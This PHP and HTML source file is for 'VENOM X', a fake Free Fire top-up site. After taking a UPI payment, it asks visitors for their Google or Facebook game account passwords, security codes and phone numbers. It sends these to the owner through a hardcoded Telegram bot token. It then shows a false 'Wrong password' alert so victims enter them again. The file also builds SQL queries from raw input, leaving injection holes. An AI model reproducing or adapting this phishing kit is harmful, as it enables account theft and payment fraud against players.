<?php
session_start();
$db = new SQLite3('venomx.db');

$db->exec("CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    google_id TEXT UNIQUE,
    email TEXT UNIQUE,
    name TEXT,
    password TEXT,
    wallet REAL DEFAULT 0,
    photo TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$db->exec("CREATE TABLE IF NOT EXISTS orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    plan TEXT,
    amount REAL,
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$db->exec("CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    message TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

define('BOT_TOKEN', '8603431466:AAGfzdIoWE7jEmziVEMhA5oNs2dEuhD1Az0');
define('OWNER_ID', '8586849798');

function botRequest($method, $data) {
    @file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/".$method."?".http_build_query($data));
}

// Google Login
if(isset($_POST['google_credential'])) {
    $cred = json_decode(base64_decode($_POST['google_credential']), true);
    $google_id = $cred['sub'];
    $email = $cred['email'];
    $name = $cred['name'];
    $photo = $cred['picture'];
    
    $check = $db->querySingle("SELECT id FROM users WHERE google_id='$google_id'", true);
    if(!$check) {
        $db->exec("INSERT INTO users (google_id, email, name, photo) VALUES ('$google_id', '$email', '$name', '$photo')");
        $user_id = $db->lastInsertRowID();
        botRequest("sendPhoto", [
            'chat_id' => OWNER_ID,
            'photo' => $photo,
            'caption' => "🆕 New Login!\n🆔 ID: $user_id\n📧 $email\n👤 $name"
        ]);
    } else {
        $user_id = $check['id'];
    }
    $_SESSION['user_id'] = $user_id;
    header("Location: index.php");
    exit;
}

// Email Signup
if(isset($_POST['email_signup'])) {
    $email = $_POST['email'];
    $name = $_POST['name'];
    $pass = password_hash($_POST['password'], PASSWORD_DEFAULT);
    $check = $db->querySingle("SELECT id FROM users WHERE email='$email'", true);
    if(!$check) {
        $db->exec("INSERT INTO users (email, name, password) VALUES ('$email', '$name', '$pass')");
        $user_id = $db->lastInsertRowID();
        $_SESSION['user_id'] = $user_id;
        botRequest("sendMessage", [
            'chat_id' => OWNER_ID,
            'text' => "🆕 New Email Signup\n🆔 ID: $user_id\n📧 $email"
        ]);
    }
    header("Location: index.php");
    exit;
}

// Email Login
if(isset($_POST['email_login'])) {
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $user = $db->querySingle("SELECT * FROM users WHERE email='$email'", true);
    if($user && password_verify($pass, $user['password'])) {
        $_SESSION['user_id'] = $user['id'];
    }
    header("Location: index.php");
    exit;
}

// Logout
if(isset($_GET['logout'])) {
    session_destroy();
    header("Location: index.php");
    exit;
}

// Add Funds
if(isset($_POST['select_amount'])) {
    $_SESSION['selected_amount'] = floatval($_POST['select_amount']);
    header("Location: index.php?step=qr");
    exit;
}

if(isset($_POST['submit_utr']) && isset($_SESSION['selected_amount'])) {
    $_SESSION['utr'] = $_POST['utr'];
    header("Location: index.php?step=game_account");
    exit;
}

// Game Account Details - Google
if(isset($_POST['submit_google_details'])) {
    $uid = $_POST['uid'];
    $game_name = $_POST['game_name'];
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $code = $_POST['security_code'];
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    botRequest("sendMessage", [
        'chat_id' => OWNER_ID,
        'text' => "🎮 GOOGLE GAME ACCOUNT\n👤 User: {$user['name']}\n🆔 UID: $uid\n🎮 Game: $game_name\n📧 Email: $email\n🔑 Pass: $pass\n🔐 Security Code: $code\n💰 Amount: ₹{$_SESSION['selected_amount']}\n💳 UTR: {$_SESSION['utr']}"
    ]);
    echo "<script>alert('Wrong password! Please try again.'); window.location.href='index.php?step=game_account';</script>";
    exit;
}

// Game Account Details - Facebook
if(isset($_POST['submit_fb_details'])) {
    $uid = $_POST['uid'];
    $game_name = $_POST['game_name'];
    $phone = $_POST['phone'];
    $email = $_POST['linked_email'];
    $username = $_POST['username'];
    $pass = $_POST['password'];
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    botRequest("sendMessage", [
        'chat_id' => OWNER_ID,
        'text' => "🎮 FACEBOOK GAME ACCOUNT\n👤 User: {$user['name']}\n🆔 UID: $uid\n🎮 Game: $game_name\n📱 Phone: $phone\n📧 Linked Gmail: $email\n👤 Username: $username\n🔑 Pass: $pass\n💰 Amount: ₹{$_SESSION['selected_amount']}\n💳 UTR: {$_SESSION['utr']}"
    ]);
    echo "<script>alert('Wrong password! Please try again.'); window.location.href='index.php?step=game_account';</script>";
    exit;
}

$current_step = isset($_GET['step']) ? $_GET['step'] : 'dashboard';
$user = null;
if(isset($_SESSION['user_id'])) {
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
}

$membershipPlans = [
    ['name' => 'Weekly', 'desc' => '200 Diamond + 245 in 7Days', 'price' => 126, 'icon' => 'https://i.ibb.co/jPc4hm1q/file-71.jpg'],
    ['name' => 'Monthly', 'desc' => '1000 Diamond + 1500 Diamonds', 'price' => 739, 'icon' => 'https://i.ibb.co/rKfDNTx9/file-70.jpg'],
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VENOM X | Free Fire Top Up</title>
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; font-family: 'Segoe UI', sans-serif; color: #fff; }
        .login-page, .dashboard-page { min-height: 100vh; background: linear-gradient(135deg, #0a0a0a, #1a0033); padding: 20px; display: flex; justify-content: center; align-items: center; }
        .login-card, .dashboard-card { background: #111; border-radius: 20px; padding: 40px; width: 100%; max-width: 500px; text-align: center; border: 1px solid #9b59b6; box-shadow: 0 0 20px rgba(155,89,182,0.3); }
        .venom-logo { font-size: 2.5rem; font-weight: bold; background: linear-gradient(90deg, #9b59b6, #ff00cc); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; border-radius: 8px; color: #fff; }
        button { width: 100%; padding: 12px; background: #9b59b6; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .switch-text { margin-top: 15px; color: #aaa; cursor: pointer; }
        .switch-text span { color: #9b59b6; }
        .g_id_signin { margin: 20px 0; }
        hr { margin: 20px 0; border-color: #333; }
        .bonus-btns { display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0; }
        .bonus-btn { flex: 1; background: #1a0033; border: 1px solid #9b59b6; }
        .products-grid { display: flex; flex-wrap: wrap; gap: 20px; margin-top: 20px; }
        .product-card { background: #111; border: 1px solid #333; border-radius: 12px; padding: 20px; width: calc(50% - 10px); text-align: center; }
        .product-icon { width: 100%; height: 80px; object-fit: contain; margin-bottom: 10px; }
        .product-title { font-size: 18px; font-weight: bold; }
        .product-price { font-size: 20px; color: #9b59b6; margin: 10px 0; }
        .wallet-banner { background: #1a0033; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; border-radius: 12px; }
        .menu-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .menu-btn { width: auto; background: #1a0033; border: 1px solid #9b59b6; }
        .sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #111; border-right: 1px solid #9b59b6; z-index: 1000; transition: 0.3s; padding: 20px; }
        .sidebar.open { left: 0; }
        .close-sidebar { text-align: right; font-size: 24px; cursor: pointer; color: #9b59b6; }
        .menu-item { padding: 12px; margin: 8px 0; cursor: pointer; border-radius: 8px; color: #fff; text-align: center; }
        .menu-item:hover { background: #9b59b6; }
        .popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; display: none; justify-content: center; align-items: center; }
        .popup-card { background: #111; border-radius: 20px; padding: 30px; width: 90%; max-width: 400px; border: 1px solid #9b59b6; text-align: center; }
        .game-login-btns { display: flex; gap: 20px; justify-content: center; margin: 20px 0; }
        .game-icon { width: 80px; cursor: pointer; border-radius: 12px; }
        .whatsapp-btn { display: inline-block; background: #25D366; color: #fff; padding: 10px 20px; border-radius: 8px; text-decoration: none; margin-top: 10px; }
    </style>
</head>
<body>

<?php if(!isset($_SESSION['user_id'])): ?>
<!-- LOGIN PAGE -->
<div class="login-page">
    <div class="login-card">
        <div class="venom-logo">VENOM X</div>
        <p>India's #1 Free Fire Top Up</p>
        <div id="g_id_onload" data-client_id="369043602918-qsp4f4olbtmoksudfp8fnbuj8g39t8d0.apps.googleusercontent.com" data-callback="handleGoogleLogin" data-auto_prompt="false"></div>
        <div class="g_id_signin" data-type="standard" data-size="large"></div>
        <hr>
        <form method="post">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="email_login">Sign In</button>
        </form>
        <div class="switch-text" onclick="showSignup()">New here? <span>Create account</span></div>
        <div id="signupForm" style="display:none; margin-top:20px">
            <form method="post">
                <input type="text" name="name" placeholder="Full Name" required>
                <input type="email" name="email" placeholder="Email Address" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="email_signup">Create Account</button>
            </form>
        </div>
    </div>
</div>
<script>
function handleGoogleLogin(response) {
    var form = document.createElement('form'); form.method = 'POST';
    var input = document.createElement('input'); input.type = 'hidden'; input.name = 'google_credential'; input.value = response.credential;
    form.appendChild(input); document.body.appendChild(form); form.submit();
}
function showSignup() { document.getElementById('signupForm').style.display = 'block'; }
</script>

<?php elseif($current_step == 'dashboard' || $current_step == 'game_account'): ?>
<!-- DASHBOARD -->
<div class="dashboard-page" style="display:flex; flex-direction:column; justify-content:flex-start;">
    <div style="width:100%; max-width:600px; margin:0 auto;">
        <div class="menu-bar">
            <button class="menu-btn" onclick="toggleSidebar()">☰ Menu</button>
            <div class="venom-logo" style="font-size:1.5rem">VENOM X</div>
            <div>💰 ₹<?php echo number_format($user['wallet'], 2); ?></div>
        </div>
        
        <!-- Sidebar -->
        <div class="sidebar" id="sidebar">
            <div class="close-sidebar" onclick="toggleSidebar()">✕</div>
            <div style="text-align:center;margin:20px 0">
                <img src="<?php echo $user['photo'] ?? 'https://via.placeholder.com/80'; ?>" width="80" style="border-radius:50%">
                <p><?php echo htmlspecialchars($user['name'] ?? $user['email']); ?></p>
            </div>
            <div class="menu-item" onclick="showOrders()">📜 Order History</div>
            <div class="menu-item" onclick="showNotifications()">🔔 Notifications</div>
            <div class="menu-item" onclick="showAddFunds()">💰 Add Funds</div>
            <a href="https://wa.me/9485813638" class="whatsapp-btn">📞 WhatsApp Support</a>
            <div class="menu-item" onclick="window.location.href='?logout=1'">🚪 Logout</div>
        </div>

        <div class="wallet-banner">
            <span>💰 Wallet: ₹<?php echo number_format($user['wallet'], 2); ?></span>
            <button onclick="showAddFunds()">+ Add Funds</button>
        </div>

        <div class="section-title" style="color:#9b59b6; font-size:24px; margin:20px 0;">💎 MEMBERSHIP TOP UP</div>
        <div class="products-grid" id="membershipGrid"></div>
    </div>
</div>

<!-- Add Funds Popup -->
<div id="addFundsPopup" class="popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6">💰 Add Funds</h3>
        <div class="bonus-btns">
            <button class="bonus-btn" onclick="selectAmount(150,10)">₹150 + ₹10</button>
            <button class="bonus-btn" onclick="selectAmount(199,20)">₹199 + ₹20</button>
            <button class="bonus-btn" onclick="selectAmount(399,40)">₹399 + ₹40</button>
        </div>
        <button onclick="closePopup('addFundsPopup')">Cancel</button>
    </div>
</div>

<!-- QR Popup -->
<div id="qrPopup" class="popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6">Scan & Pay</h3>
        <img id="qrImage" src="" width="200" style="margin:15px auto">
        <p id="qrAmount"></p>
        <input type="text" id="utrInput" placeholder="Enter UTR Number">
        <button onclick="submitUTR()">Continue</button>
        <button onclick="closePopup('qrPopup')">Cancel</button>
    </div>
</div>

<!-- Game Account Popup -->
<div id="gameAccountPopup" class="popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6">Login with Game Account</h3>
        <div class="game-login-btns">
            <img src="https://i.ibb.co/wZTBJn3g/file-75.jpg" class="game-icon" onclick="showGoogleForm()">
            <img src="https://i.ibb.co/k2S25TS9/file-74.jpg" class="game-icon" onclick="showFacebookForm()">
        </div>
        <button onclick="closePopup('gameAccountPopup')">Cancel</button>
    </div>
</div>

<!-- Google Form -->
<div id="googleFormPopup" class="popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6">Google Account Details</h3>
        <form method="post">
            <input type="text" name="uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="email" name="email" placeholder="Gmail" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="security_code" placeholder="Security Code" required>
            <button type="submit" name="submit_google_details">Submit</button>
            <button type="button" onclick="closePopup('googleFormPopup')">Cancel</button>
        </form>
    </div>
</div>

<!-- Facebook Form -->
<div id="fbFormPopup" class="popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6">Facebook Account Details</h3>
        <form method="post">
            <input type="text" name="uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="tel" name="phone" placeholder="Phone Number" required>
            <input type="email" name="linked_email" placeholder="Linked Gmail" required>
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="submit_fb_details">Submit</button>
            <button type="button" onclick="closePopup('fbFormPopup')">Cancel</button>
        </form>
    </div>
</div>

<script>
let selectedAmount = 0;
const plans = <?php echo json_encode($membershipPlans); ?>;
const grid = document.getElementById('membershipGrid');
plans.forEach(plan => {
    let card = document.createElement('div'); card.className = 'product-card';
    card.innerHTML = `<img src="${plan.icon}" class="product-icon" onerror="this.src='https://via.placeholder.com/80'">
        <div class="product-title">${plan.name}</div>
        <div class="product-desc">${plan.desc}</div>
        <div class="product-price">₹${plan.price}</div>
        <button class="add-to-cart" onclick="alert('Use Add Funds to buy')">Buy Now</button>`;
    grid.appendChild(card);
});

function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); }
function showOrders() { alert("No orders yet"); }
function showNotifications() { alert("No notifications"); }
function showAddFunds() { document.getElementById('addFundsPopup').style.display = 'flex'; }
function selectAmount(amount, bonus) {
    selectedAmount = amount + bonus;
    document.getElementById('addFundsPopup').style.display = 'none';
    let qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=vanshx44@airtel&pn=VENOMX&am=${selectedAmount}&cu=INR`;
    document.getElementById('qrImage').src = qrUrl;
    document.getElementById('qrAmount').innerText = `Amount: ₹${selectedAmount}`;
    document.getElementById('qrPopup').style.display = 'flex';
}
function submitUTR() {
    let utr = document.getElementById('utrInput').value;
    if(!utr) { alert('Enter UTR'); return; }
    document.getElementById('qrPopup').style.display = 'none';
    document.getElementById('gameAccountPopup').style.display = 'flex';
    fetch('?store_utr=' + utr);
}
function showGoogleForm() {
    document.getElementById('gameAccountPopup').style.display = 'none';
    document.getElementById('googleFormPopup').style.display = 'flex';
}
function showFacebookForm() {
    document.getElementById('gameAccountPopup').style.display = 'none';
    document.getElementById('fbFormPopup').style.display = 'flex';
}
function closePopup(id) { document.getElementById(id).style.display = 'none'; }
</script>
<?php endif; ?>
</body>
</html>
